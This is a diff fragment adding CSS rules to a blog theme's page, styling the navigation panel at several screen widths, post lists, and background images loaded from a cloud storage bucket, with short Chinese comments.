+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+    .nav-right nav a.hover > span{
+        color: #ffffff !important;
+    }
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+    
+    /* 背景图样式 */
+    
+    #post {
+        background: url(https://ttycp3.oss-cn-beijing.aliyuncs.com/img/110.jpg);
+    }
+    
+    
+
+
+    /*引用块样式*/
+    
+    
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://ttycp3.oss-cn-beijing.aliyuncs.com/img/4caf928d4512df81ec482d1e953bf4db9dbb7533.jpg@942w_1307h_progressive.webp");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+    
+    
+</style>
+
+
+
+
+
+
+
+
+
+
+</html>
